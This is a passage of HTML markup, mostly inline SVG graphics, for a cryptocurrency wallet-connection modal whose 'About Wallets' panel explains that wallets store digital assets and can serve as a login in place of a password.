<div class="sc-idiyUo hBuwwI" style="--height: 501px; --width: 343px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" data-projection-id="242" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-projection-id="244">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div data-projection-id="246" style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">About Wallets<br></div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up" data-projection-id="248">

                <div class="sc-ksZaOG dmNTWR" data-projection-id="250" style="pointer-events: auto;">

                    <div class="sc-dkzDqf jKlSZW" data-projection-id="252">

                        <div class="sc-jSMfEi lbAEgN" data-projection-id="254"></div>

                        <div class="sc-cTQhss kAlRaS">

                            <div class="sc-ciZhAO iSzwtb">

                                <div class="sc-jdAMXn" data-projection-id="256" style="position: absolute;">

                                    <div style="display: flex; align-items: center; justify-content: center;">

                                        <div data-projection-id="258" style="z-index: 4; position: relative; display: flex; align-items: center; justify-content: center; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #6366F1); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(99, 102, 241, 0.3)); transform: none;">

                                            <svg width="38" height="44" viewBox="0 0 38 44" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M19 0.875C21.4853 0.875 23.5 2.88972 23.5 5.375V27.761L30.068 21.193C31.8254 19.4357 34.6746 19.4357 36.432 21.193C38.1893 22.9504 38.1893 25.7996 36.432 27.557L22.182 41.807C20.4246 43.5643 17.5754 43.5643 15.818 41.807L1.56802 27.557C-0.18934 25.7996 -0.18934 22.9504 1.56802 21.193C3.32538 19.4357 6.17462 19.4357 7.93198 21.193L14.5 27.761V5.375C14.5 2.88972 16.5147 0.875 19 0.875Z" fill="var(--ck-graphic-secondary-color, white)"></path>

                                            </svg>

                                        </div>

                                        <div class="sc-kgUAyh casSyR" data-projection-id="260" style="position: relative; z-index: 10; margin: 0px -8px; width: 112px; height: 112px; opacity: 1;">

                                            <div class="sc-hTtwUo gsQaVR" data-projection-id="262" style="background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 3px 15px rgba(0, 0, 0, 0.1)); opacity: 1;">

                                                <div class="sc-BeQoi lgfrNL" data-projection-id="264"></div>

                                                <div data-projection-id="266" style="z-index: 2; position: relative;">

                                                    <svg width="58" height="50" viewBox="0 0 58 50" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M57.9332 20.3335V42.1113C57.9332 46.4069 54.451 49.8891 50.1555 49.8891H8.15546C3.85991 49.8891 0.377686 46.4069 0.377686 42.1113V25.0002V7.8891C0.377686 3.59355 3.85991 0.111328 8.15546 0.111328H47.0444C48.7626 0.111328 50.1555 1.50422 50.1555 3.22244C50.1555 4.94066 48.7626 6.33355 47.0443 6.33355H9.71102C7.9928 6.33355 6.59991 7.72644 6.59991 9.44466C6.59991 11.1629 7.9928 12.5558 9.71102 12.5558H50.1555C54.451 12.5558 57.9332 16.038 57.9332 20.3335ZM46.2667 34.3337C48.4145 34.3337 50.1556 32.5926 50.1556 30.4448C50.1556 28.297 48.4145 26.5559 46.2667 26.5559C44.1189 26.5559 42.3778 28.297 42.3778 30.4448C42.3778 32.5926 44.1189 34.3337 46.2667 34.3337Z" fill="var(--ck-graphic-primary-color, var(--ck-body-color))"></path>

                                                        <defs>

                                                            <linearGradient id="paint0_linear_2501_7732" x1="29.1555" y1="0.111328" x2="29.1555" y2="49.8891" gradientUnits="userSpaceOnUse">

                                                                <stop stop-color="var(--ck-body-background-transparent, transparent)"></stop>

                                                                <stop offset="1" stop-color="var(--ck-body-background)"></stop>

                                                            </linearGradient>

                                                        </defs>

                                                    </svg>

                                                </div>

                                            </div>

                                        </div>

                                        <div data-projection-id="268" style="z-index: 4; position: relative; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #3897FB); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(56, 151, 251, 0.3)); transform: none;">

                                            <div class="sc-bBXxYQ HAmYI">

                                                <div style="position: relative; left: -2px; top: 3px;">

                                                    <svg width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                        <path d="M35.4446 0.839914L2.14484 10.7065C0.0395033 11.3303 -0.632966 13.9786 0.919705 15.5313L7.9624 22.574C9.47585 24.0874 11.8661 24.273 13.5951 23.0114L25.2866 14.4797C25.5558 14.2832 25.9281 14.3121 26.1638 14.5478C26.3998 14.7838 26.4285 15.1567 26.2313 15.426L17.6874 27.0937C16.4213 28.8228 16.6052 31.2168 18.1206 32.7322L25.1811 39.7926C26.7337 41.3453 29.382 40.6728 30.0058 38.5675L39.8724 5.2677C40.6753 2.55794 38.1544 0.037024 35.4446 0.839914Z" fill="var(--ck-graphic-secondary-color, white)"></path>

                                                    </svg>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="sc-iAvgwm bDnYPG">

                                <div class="sc-efBctP jMNqtD" data-projection-id="270">

                                    <div class="sc-bZnhIo haLOJ">

                                        <div class="sc-jdAMXn" data-projection-id="272">

                                            <div style="display: flex; align-items: center; justify-content: center;">

                                                <div data-projection-id="274" style="z-index: 4; position: relative; display: flex; align-items: center; justify-content: center; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #6366F1); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(99, 102, 241, 0.3)); transform: translateX(0%) scale(1) rotate(0deg) translateZ(0px);">

                                                    <svg width="38" height="44" viewBox="0 0 38 44" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M19 0.875C21.4853 0.875 23.5 2.88972 23.5 5.375V27.761L30.068 21.193C31.8254 19.4357 34.6746 19.4357 36.432 21.193C38.1893 22.9504 38.1893 25.7996 36.432 27.557L22.182 41.807C20.4246 43.5643 17.5754 43.5643 15.818 41.807L1.56802 27.557C-0.18934 25.7996 -0.18934 22.9504 1.56802 21.193C3.32538 19.4357 6.17462 19.4357 7.93198 21.193L14.5 27.761V5.375C14.5 2.88972 16.5147 0.875 19 0.875Z" fill="var(--ck-graphic-secondary-color, white)"></path>

                                                    </svg>

                                                </div>

                                                <div class="sc-kgUAyh casSyR" data-projection-id="276" style="position: relative; z-index: 10; margin: 0px -8px; width: 112px; height: 112px;">

                                                    <div class="sc-hTtwUo gsQaVR" data-projection-id="278" style="background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 3px 15px rgba(0, 0, 0, 0.1)); opacity: 1;">

                                                        <div class="sc-BeQoi lgfrNL" data-projection-id="280"></div>

                                                        <div data-projection-id="282" style="z-index: 2; position: relative;">

                                                            <svg width="58" height="50" viewBox="0 0 58 50" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M57.9332 20.3335V42.1113C57.9332 46.4069 54.451 49.8891 50.1555 49.8891H8.15546C3.85991 49.8891 0.377686 46.4069 0.377686 42.1113V25.0002V7.8891C0.377686 3.59355 3.85991 0.111328 8.15546 0.111328H47.0444C48.7626 0.111328 50.1555 1.50422 50.1555 3.22244C50.1555 4.94066 48.7626 6.33355 47.0443 6.33355H9.71102C7.9928 6.33355 6.59991 7.72644 6.59991 9.44466C6.59991 11.1629 7.9928 12.5558 9.71102 12.5558H50.1555C54.451 12.5558 57.9332 16.038 57.9332 20.3335ZM46.2667 34.3337C48.4145 34.3337 50.1556 32.5926 50.1556 30.4448C50.1556 28.297 48.4145 26.5559 46.2667 26.5559C44.1189 26.5559 42.3778 28.297 42.3778 30.4448C42.3778 32.5926 44.1189 34.3337 46.2667 34.3337Z" fill="var(--ck-graphic-primary-color, var(--ck-body-color))"></path>

                                                                <defs>

                                                                    <linearGradient id="paint0_linear_2501_7732" x1="29.1555" y1="0.111328" x2="29.1555" y2="49.8891" gradientUnits="userSpaceOnUse">

                                                                        <stop stop-color="var(--ck-body-background-transparent, transparent)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-body-background)"></stop>

                                                                    </linearGradient>

                                                                </defs>

                                                            </svg>

                                                        </div>

                                                    </div>

                                                </div>

                                                <div data-projection-id="284" style="z-index: 4; position: relative; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #3897FB); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(56, 151, 251, 0.3)); transform: translateX(0%) scale(1) rotate(0deg) translateZ(0px);">

                                                    <div class="sc-bBXxYQ HAmYI">

                                                        <div style="position: relative; left: -2px; top: 3px;">

                                                            <svg width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                                <path d="M35.4446 0.839914L2.14484 10.7065C0.0395033 11.3303 -0.632966 13.9786 0.919705 15.5313L7.9624 22.574C9.47585 24.0874 11.8661 24.273 13.5951 23.0114L25.2866 14.4797C25.5558 14.2832 25.9281 14.3121 26.1638 14.5478C26.3998 14.7838 26.4285 15.1567 26.2313 15.426L17.6874 27.0937C16.4213 28.8228 16.6052 31.2168 18.1206 32.7322L25.1811 39.7926C26.7337 41.3453 29.382 40.6728 30.0058 38.5675L39.8724 5.2677C40.6753 2.55794 38.1544 0.037024 35.4446 0.839914Z" fill="var(--ck-graphic-secondary-color, white)"></path>

                                                            </svg>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                    <div class="sc-iBkjds emnDjo" data-projection-id="286" style="gap: 8px; padding-bottom: 0px;">

                                        <h1 class="sc-ftvSup fEIqVI" data-projection-id="288">For your digital assets<br></h1>

                                        <div class="sc-papXJ jCcNJP">Wallets let you send, receive, store, and interact with digital assets like NFTs and other Ethereum tokens.<br></div>

                                    </div>

                                </div>

                                <div class="sc-efBctP cVqqga" data-projection-id="290">

                                    <div class="sc-bZnhIo haLOJ">

                                        <div class="sc-jdAMXn" data-projection-id="292">

                                            <div style="position: relative; left: -14px;">

                                                <div class="sc-kgUAyh casSyR" data-projection-id="294" style="z-index: 10; position: absolute; left: 15px; top: 12px; width: 32px; height: 32px;">

                                                    <div class="sc-hTtwUo gsQaVR" data-projection-id="296" style="background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 2px 5px rgba(37, 41, 46, 0.16)); opacity: 1;">

                                                        <div class="sc-bBXxYQ HAmYI">

                                                            <svg width="58" height="50" viewBox="0 0 58 50" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M57.9332 20.3335V42.1113C57.9332 46.4069 54.451 49.8891 50.1555 49.8891H8.15546C3.85991 49.8891 0.377686 46.4069 0.377686 42.1113V25.0002V7.8891C0.377686 3.59355 3.85991 0.111328 8.15546 0.111328H47.0444C48.7626 0.111328 50.1555 1.50422 50.1555 3.22244C50.1555 4.94066 48.7626 6.33355 47.0443 6.33355H9.71102C7.9928 6.33355 6.59991 7.72644 6.59991 9.44466C6.59991 11.1629 7.9928 12.5558 9.71102 12.5558H50.1555C54.451 12.5558 57.9332 16.038 57.9332 20.3335ZM46.2667 34.3337C48.4145 34.3337 50.1556 32.5926 50.1556 30.4448C50.1556 28.297 48.4145 26.5559 46.2667 26.5559C44.1189 26.5559 42.3778 28.297 42.3778 30.4448C42.3778 32.5926 44.1189 34.3337 46.2667 34.3337Z" fill="var(--ck-graphic-primary-color, var(--ck-body-color))"></path>

                                                                <defs>

                                                                    <linearGradient id="paint0_linear_2501_7732" x1="29.1555" y1="0.111328" x2="29.1555" y2="49.8891" gradientUnits="userSpaceOnUse">

                                                                        <stop stop-color="var(--ck-body-background-transparent, transparent)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-body-background)"></stop>

                                                                    </linearGradient>

                                                                </defs>

                                                            </svg>

                                                        </div>

                                                    </div>

                                                </div>

                                                <div data-projection-id="298" style="z-index: 7; position: relative; display: flex; align-items: center; padding: 21px 52px 21px 56px; background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 2px 9px rgba(0, 0, 0, 0.07)); border-radius: var(--ck-border-radius, 16px); transform: none;">

                                                    <div class="sc-BeQoi lgfrNL" data-projection-id="300"></div>

                                                    <div style="position: relative; z-index: 2; top: 1px; left: 1px;">

                                                        <svg width="131" height="14" viewBox="0 0 131 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                            <path d="M5.74805 13.2549C8.86816 13.2549 10.7227 10.6973 10.7227 6.63672C10.7227 2.57617 8.85059 0.0625 5.74805 0.0625C2.63672 0.0625 0.755859 2.59375 0.755859 6.64551C0.755859 10.7148 2.61914 13.2549 5.74805 13.2549ZM5.74805 11.4004C4.02539 11.4004 3.04102 9.64258 3.04102 6.63672C3.04102 3.68359 4.04297 1.91699 5.74805 1.91699C7.44434 1.91699 8.4375 3.6748 8.4375 6.64551C8.4375 9.65137 7.46191 11.4004 5.74805 11.4004Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M13.0869 13.1758C13.4561 13.1758 13.6934 13.0439 13.9658 12.6221L15.9697 9.66016H16.0137L18.0264 12.6572C18.2549 13.0088 18.4922 13.1758 18.8965 13.1758C19.4854 13.1758 19.9424 12.7891 19.9424 12.209C19.9424 11.9805 19.8633 11.7695 19.7051 11.541L17.376 8.28906L19.6963 5.16016C19.8896 4.90527 19.9688 4.68555 19.9688 4.43066C19.9688 3.88574 19.5381 3.49902 18.9229 3.49902C18.5361 3.49902 18.2988 3.6748 18.0176 4.10547L16.1191 6.95312H16.0752L14.1328 4.08789C13.8516 3.64844 13.6318 3.49902 13.2012 3.49902C12.6035 3.49902 12.1465 3.91211 12.1465 4.44824C12.1465 4.70312 12.2256 4.92285 12.3838 5.13379L14.7129 8.35059L12.3486 11.5498C12.1641 11.8135 12.0762 12.0156 12.0762 12.2705C12.0762 12.7979 12.498 13.1758 13.0869 13.1758Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M26.2441 13.2549C29.1445 13.2549 31.1924 11.7432 31.1924 9.57227C31.1924 7.9375 30.0146 6.68066 28.3184 6.3291V6.27637C29.7773 5.87207 30.7178 4.7998 30.7178 3.45508C30.7178 1.48633 28.8633 0.0625 26.2441 0.0625C23.625 0.0625 21.7617 1.49512 21.7617 3.44629C21.7617 4.80859 22.7109 5.88965 24.1699 6.27637V6.3291C22.4736 6.67188 21.3047 7.92871 21.3047 9.57227C21.3047 11.7344 23.335 13.2549 26.2441 13.2549ZM26.2441 5.55566C24.9258 5.55566 24.0029 4.78223 24.0029 3.6748C24.0029 2.55859 24.9258 1.77637 26.2441 1.77637C27.5537 1.77637 28.4854 2.5498 28.4854 3.6748C28.4854 4.78223 27.5537 5.55566 26.2441 5.55566ZM26.2441 11.5234C24.7236 11.5234 23.6514 10.6357 23.6514 9.40527C23.6514 8.1748 24.7236 7.28711 26.2441 7.28711C27.7646 7.28711 28.8369 8.16602 28.8369 9.40527C28.8369 10.6357 27.7646 11.5234 26.2441 11.5234Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M36.3164 13.1494C37.7578 13.1494 38.7598 12.4199 39.208 11.3477H39.252V12.0771C39.252 12.7891 39.7266 13.1758 40.3594 13.1758C40.9922 13.1758 41.4404 12.7803 41.4404 12.0771V1.29297C41.4404 0.554688 40.9834 0.141602 40.3418 0.141602C39.7002 0.141602 39.252 0.554688 39.252 1.29297V5.24805H39.1992C38.707 4.21973 37.6523 3.52539 36.3164 3.52539C33.9697 3.52539 32.4492 5.38867 32.4492 8.33301C32.4492 11.2949 33.9697 13.1494 36.3164 13.1494ZM36.9756 11.3564C35.5605 11.3564 34.6904 10.1963 34.6904 8.3418C34.6904 6.49609 35.5693 5.32715 36.9756 5.32715C38.3555 5.32715 39.2607 6.51367 39.2607 8.3418C39.2607 10.1875 38.3555 11.3564 36.9756 11.3564Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M44.0508 13.1494C44.6396 13.1494 44.9736 12.8594 45.1846 12.1738L46.0195 9.76562H50.7568L51.5918 12.1914C51.7939 12.8682 52.1367 13.1494 52.752 13.1494C53.4111 13.1494 53.8857 12.7188 53.8857 12.1035C53.8857 11.9014 53.8418 11.6992 53.7363 11.4092L50.0449 1.38965C49.7285 0.537109 49.2188 0.167969 48.3838 0.167969C47.5576 0.167969 47.0479 0.554688 46.7402 1.39844L43.0576 11.4092C42.9521 11.6816 42.9082 11.9277 42.9082 12.1035C42.9082 12.7451 43.3564 13.1494 44.0508 13.1494ZM46.5557 7.97266L48.3398 2.55859H48.4014L50.2031 7.97266H46.5557Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M60.1172 13.2549C62.8594 13.2549 64.8545 11.4004 64.8545 8.8252C64.8545 6.42578 63.1406 4.66797 60.6973 4.66797C58.9746 4.66797 57.709 5.54688 57.208 6.71582H57.1641V6.58398C57.208 3.66602 58.2275 1.89941 60.1436 1.89941C61.084 1.89941 61.7607 2.26855 62.3496 3.07715C62.7012 3.52539 62.9824 3.73633 63.4307 3.73633C64.0283 3.73633 64.3975 3.34082 64.3975 2.82227C64.3975 2.57617 64.3359 2.35645 64.1953 2.10156C63.5625 0.897461 62.0859 0.0537109 60.1523 0.0537109C56.9268 0.0537109 54.9932 2.57617 54.9932 6.80371C54.9932 8.24512 55.2305 9.45801 55.6963 10.4336C56.5752 12.2881 58.1396 13.2549 60.1172 13.2549ZM60.082 11.4092C58.667 11.4092 57.5508 10.293 57.5508 8.86914C57.5508 7.4541 58.6494 6.41699 60.1084 6.41699C61.5674 6.41699 62.6309 7.4541 62.6221 8.91309C62.6221 10.3018 61.4971 11.4092 60.082 11.4092Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M68.1328 8.83398C68.8447 8.83398 69.416 8.27148 69.416 7.55078C69.416 6.83008 68.8447 6.25879 68.1328 6.25879C67.4121 6.25879 66.8408 6.83008 66.8408 7.55078C66.8408 8.27148 67.4121 8.83398 68.1328 8.83398Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M73.3359 8.83398C74.0479 8.83398 74.6191 8.27148 74.6191 7.55078C74.6191 6.83008 74.0479 6.25879 73.3359 6.25879C72.6152 6.25879 72.0439 6.83008 72.0439 7.55078C72.0439 8.27148 72.6152 8.83398 73.3359 8.83398Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M78.5391 8.83398C79.251 8.83398 79.8223 8.27148 79.8223 7.55078C79.8223 6.83008 79.251 6.25879 78.5391 6.25879C77.8184 6.25879 77.2471 6.83008 77.2471 7.55078C77.2471 8.27148 77.8184 8.83398 78.5391 8.83398Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M83.7422 8.83398C84.4541 8.83398 85.0254 8.27148 85.0254 7.55078C85.0254 6.83008 84.4541 6.25879 83.7422 6.25879C83.0215 6.25879 82.4502 6.83008 82.4502 7.55078C82.4502 8.27148 83.0215 8.83398 83.7422 8.83398Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M92.2148 13.2549C94.957 13.2549 96.9521 11.4004 96.9521 8.8252C96.9521 6.42578 95.2383 4.66797 92.7949 4.66797C91.0723 4.66797 89.8066 5.54688 89.3057 6.71582H89.2617V6.58398C89.3057 3.66602 90.3252 1.89941 92.2412 1.89941C93.1816 1.89941 93.8584 2.26855 94.4473 3.07715C94.7988 3.52539 95.0801 3.73633 95.5283 3.73633C96.126 3.73633 96.4951 3.34082 96.4951 2.82227C96.4951 2.57617 96.4336 2.35645 96.293 2.10156C95.6602 0.897461 94.1836 0.0537109 92.25 0.0537109C89.0244 0.0537109 87.0908 2.57617 87.0908 6.80371C87.0908 8.24512 87.3281 9.45801 87.7939 10.4336C88.6729 12.2881 90.2373 13.2549 92.2148 13.2549ZM92.1797 11.4092C90.7646 11.4092 89.6484 10.293 89.6484 8.86914C89.6484 7.4541 90.7471 6.41699 92.2061 6.41699C93.665 6.41699 94.7285 7.4541 94.7197 8.91309C94.7197 10.3018 93.5947 11.4092 92.1797 11.4092Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M103.377 13.2549C106.497 13.2549 108.352 10.6973 108.352 6.63672C108.352 2.57617 106.479 0.0625 103.377 0.0625C100.266 0.0625 98.3848 2.59375 98.3848 6.64551C98.3848 10.7148 100.248 13.2549 103.377 13.2549ZM103.377 11.4004C101.654 11.4004 100.67 9.64258 100.67 6.63672C100.67 3.68359 101.672 1.91699 103.377 1.91699C105.073 1.91699 106.066 3.6748 106.066 6.64551C106.066 9.65137 105.091 11.4004 103.377 11.4004Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M117.167 13.1758C117.8 13.1758 118.248 12.7715 118.248 12.0596V10.5654H119.127C119.733 10.5654 120.094 10.1875 120.094 9.63379C120.094 9.08887 119.733 8.70215 119.136 8.70215H118.248V1.81152C118.248 0.756836 117.554 0.141602 116.385 0.141602C115.453 0.141602 114.899 0.52832 114.073 1.75879C112.553 3.99121 111.111 6.16211 110.224 7.75293C109.872 8.38574 109.731 8.79883 109.731 9.29102C109.731 10.0469 110.268 10.5654 111.085 10.5654H116.086V12.0596C116.086 12.7715 116.543 13.1758 117.167 13.1758ZM116.121 8.75488H111.788V8.69336C112.816 6.82129 114.073 4.92285 116.086 2.04004H116.121V8.75488Z" fill="var(--ck-body-color)"></path>

                                                            <path d="M126.105 13.2549C128.918 13.2549 130.869 11.4355 130.869 8.78125C130.869 6.35547 129.138 4.6416 126.712 4.6416C125.438 4.6416 124.392 5.13379 123.855 5.9248H123.812L124.146 2.17188H129.27C129.85 2.17188 130.228 1.80273 130.228 1.24023C130.228 0.686523 129.85 0.317383 129.27 0.317383H123.803C122.81 0.317383 122.3 0.72168 122.221 1.72363L121.816 6.51367C121.808 6.56641 121.808 6.60156 121.808 6.6543C121.79 7.26953 122.15 7.78809 122.88 7.78809C123.398 7.78809 123.618 7.67383 124.146 7.14648C124.629 6.67188 125.323 6.34668 126.123 6.34668C127.617 6.34668 128.681 7.38379 128.681 8.84277C128.681 10.3457 127.617 11.4092 126.114 11.4092C124.893 11.4092 124.049 10.8027 123.618 9.77441C123.381 9.30859 123.091 9.12402 122.616 9.12402C122.019 9.12402 121.641 9.49316 121.641 10.082C121.641 10.4072 121.72 10.6709 121.843 10.9434C122.467 12.3232 124.154 13.2549 126.105 13.2549Z" fill="var(--ck-body-color)"></path>

                                                        </svg>

                                                    </div>

                                                </div>

                                                <div data-projection-id="302" style="z-index: 8; position: absolute; top: -16px; right: -28px; transform: none;">

                                                    <svg width="81" height="81" viewBox="0 0 81 81" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M81 27C81 41.9117 68.9117 54 54 54C51.2722 54 48.6389 53.5955 46.1568 52.8432L36 63H27V72H18V81H4.5C2.01472 81 0 78.9853 0 76.5V64.864C0 63.6705 0.474103 62.5259 1.31802 61.682L28.1568 34.8432C27.4045 32.3611 27 29.7278 27 27C27 12.0883 39.0883 0 54 0C68.9117 0 81 12.0883 81 27ZM60.75 25.875C63.8566 25.875 66.375 23.3566 66.375 20.25C66.375 17.1434 63.8566 14.625 60.75 14.625C57.6434 14.625 55.125 17.1434 55.125 20.25C55.125 23.3566 57.6434 25.875 60.75 25.875Z" fill="url(#paint0_linear_2509_6177)"></path>

                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M81 27C81 41.9117 68.9117 54 54 54C51.2722 54 48.6389 53.5955 46.1568 52.8432L36 63H27V72H18V81H4.5C2.01472 81 0 78.9853 0 76.5V64.864C0 63.6705 0.474103 62.5259 1.31802 61.682L28.1568 34.8432C27.4045 32.3611 27 29.7278 27 27C27 12.0883 39.0883 0 54 0C68.9117 0 81 12.0883 81 27ZM60.75 25.875C63.8566 25.875 66.375 23.3566 66.375 20.25C66.375 17.1434 63.8566 14.625 60.75 14.625C57.6434 14.625 55.125 17.1434 55.125 20.25C55.125 23.3566 57.6434 25.875 60.75 25.875Z" fill="url(#paint1_radial_2509_6177)" fill-opacity="0.2"></path>

                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M44.5658 51.2522C45.1527 50.6653 46.0151 50.4492 46.8095 50.6899C49.0823 51.3788 51.4958 51.75 54 51.75C67.6691 51.75 78.75 40.669 78.75 27C78.75 13.331 67.6691 2.25 54 2.25C40.331 2.25 29.25 13.331 29.25 27C29.25 29.5042 29.6212 31.9177 30.3101 34.1905C30.5508 34.9849 30.3347 35.8473 29.7478 36.4342L2.90901 63.273C2.48705 63.6949 2.25 64.2672 2.25 64.864V76.5C2.25 77.7426 3.25736 78.75 4.5 78.75H15.75V72C15.75 70.7574 16.7574 69.75 18 69.75H24.75V63C24.75 61.7574 25.7574 60.75 27 60.75H35.068L44.5658 51.2522ZM36 63H27V72H18V81H4.5C2.01472 81 0 78.9853 0 76.5V64.864C0 63.6705 0.474103 62.5259 1.31802 61.682L28.1568 34.8432C27.4045 32.3611 27 29.7278 27 27C27 12.0883 39.0883 0 54 0C68.9117 0 81 12.0883 81 27C81 41.9117 68.9117 54 54 54C51.2722 54 48.6389 53.5955 46.1568 52.8432L36 63ZM68.625 20.25C68.625 24.5992 65.0992 28.125 60.75 28.125C56.4008 28.125 52.875 24.5992 52.875 20.25C52.875 15.9008 56.4008 12.375 60.75 12.375C65.0992 12.375 68.625 15.9008 68.625 20.25ZM66.375 20.25C66.375 23.3566 63.8566 25.875 60.75 25.875C57.6434 25.875 55.125 23.3566 55.125 20.25C55.125 17.1434 57.6434 14.625 60.75 14.625C63.8566 14.625 66.375 17.1434 66.375 20.25Z" fill="black" fill-opacity="0.1"></path>

                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M33.4205 47.5795C33.8598 48.0188 33.8598 48.7312 33.4205 49.1705L3.0455 79.5455C2.60616 79.9848 1.89384 79.9848 1.4545 79.5455C1.01517 79.1062 1.01517 78.3938 1.4545 77.9545L31.8295 47.5795C32.2688 47.1402 32.9812 47.1402 33.4205 47.5795Z" fill="#A5A9AD"></path>

                                                        <defs>

                                                            <linearGradient id="paint0_linear_2509_6177" x1="72" y1="5.625" x2="2.25" y2="78.75" gradientUnits="userSpaceOnUse">

                                                                <stop stop-color="#D4DFE6"></stop>

                                                                <stop offset="0.0967282" stop-color="#C6CACD"></stop>

                                                                <stop offset="0.526645" stop-color="#BDBAC4"></stop>

                                                                <stop offset="1" stop-color="#939CA1"></stop>

                                                            </linearGradient>

                                                            <radialGradient id="paint1_radial_2509_6177" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(52.875 12.375) rotate(93.2705) scale(39.4392)">

                                                                <stop stop-color="white"></stop>

                                                                <stop offset="1" stop-color="white"></stop>

                                                            </radialGradient>

                                                        </defs>

                                                    </svg>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                    <div class="sc-iBkjds emnDjo" data-projection-id="304" style="gap: 8px; padding-bottom: 0px;">

                                        <h1 class="sc-ftvSup fEIqVI" data-projection-id="306">A better way to login<br></h1>

                                        <div class="sc-papXJ jCcNJP">With modern apps, your wallet can be used as an easy way to login, instead of having to remember a password.<br></div>

                                    </div>

                                </div>

                                <div class="sc-efBctP cVqqga" data-projection-id="308">

                                    <div class="sc-bZnhIo haLOJ">

                                        <div class="sc-jdAMXn" data-projection-id="310">

                                            <div data-projection-id="312" style="position: relative;">

                                                <div class="sc-kgUAyh casSyR" data-projection-id="314" style="z-index: 10; position: relative; width: 128px; height: 128px; transform: rotate(80deg) translateZ(0px);">

                                                    <div class="sc-hTtwUo gsQaVR" data-projection-id="316" style="overflow: hidden; background: var(--ck-graphic-globe-background, radial-gradient(

                                                        82.42% 82.42% at 50% 86.72%,

                                                        rgba(255, 255, 255, 0.2) 0%,

                                                        rgba(0, 0, 0, 0) 100%

                                                        ),

                                                        linear-gradient(180deg, #3897FB 0%, #5004F1 100%)); box-shadow: var(--ck-graphic-globe-box-shadow, 0px -6px 20px rgba(56, 151, 251, 0.23)); opacity: 1; transform: rotate(100deg) translateZ(0px);">

                                                        <div class="sc-cOFTSb fKvQar" data-projection-id="318" style="animation-play-state: paused;">

                                                            <svg width="128" height="128" viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                                <g>

                                                                    <circle cx="30" cy="141" r="64" stroke="url(#networkRadialA-0.14414502765126813)" stroke-width="3"></circle>

                                                                    <circle cx="78.8515" cy="131.123" r="54.1005" transform="rotate(-37.4016 78.8515 131.123)" stroke="url(#networkRadialB-0.14414502765126813)" stroke-width="3"></circle>

